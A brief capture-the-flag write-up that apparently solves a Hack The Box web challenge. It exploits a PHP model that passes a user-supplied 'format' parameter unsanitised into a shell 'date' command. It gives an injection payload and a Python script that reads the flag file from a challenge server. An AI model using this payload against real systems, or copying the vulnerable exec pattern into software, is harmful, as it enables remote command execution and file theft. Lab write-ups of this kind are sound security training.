## **Description**
Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.
<br></br>
In controllers -> `TimeController.php` we can see that it take a get parameter  `format` and pass it to getTime().

We can see the function in `TimeModel.php`

```php
<?php

class TimeModel

{

    public function __construct($format)

    {

        $this->command = "date '+" . $format . "' 2>&1";

    }

  

    public function getTime()

    {

        $time = exec($this->command);

        $res  = isset($time) ? $time : '?';

        return $res;

    }

}
```
Here where we format param get handled 
```php
$command = "date '+" . $format . "' 2>&1";
```
We can bypass it like this : 
``'; echo $(ls)'``
<br></br>
From the DockerFile we can see the flag location :
```DockerFile
# Copy flag

COPY flag /flag
```

Solution : 

```py
from requests import *
import re
url="http://83.136.250.225:33938/"

pattern = r'HTB\{.*\}'
r=get(url,params={"format":"'; echo $(cat ../flag)'"})
flag = re.findall(pattern, r.text)
print(flag)
```

